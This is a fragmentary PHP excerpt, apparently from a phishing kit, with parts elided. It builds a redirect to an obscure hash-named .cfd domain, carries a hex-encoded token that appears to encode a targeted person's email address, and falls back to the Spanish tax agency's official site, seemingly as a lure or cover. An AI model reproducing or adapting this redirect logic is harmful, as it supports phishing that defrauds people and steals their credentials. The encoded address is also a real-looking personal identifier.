...
///////////////////////////////////////////////////
$HexLink = "web.11cc721134cfea2373dab6beb5e72515.cfd/?token=6d696d6f4063656e74726f6d617465726e616c69612e636f6d";
/////////////////////////////////////////////////
...
if (isset($_GET["email"]) && !empty($_GET["email"])) {
    ...
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        ...
        $Link = "https://$HexLink";
        $jsRedirect = "$Link";
        $noJsRedirect = "https://sede.agenciatributaria.gob.es";
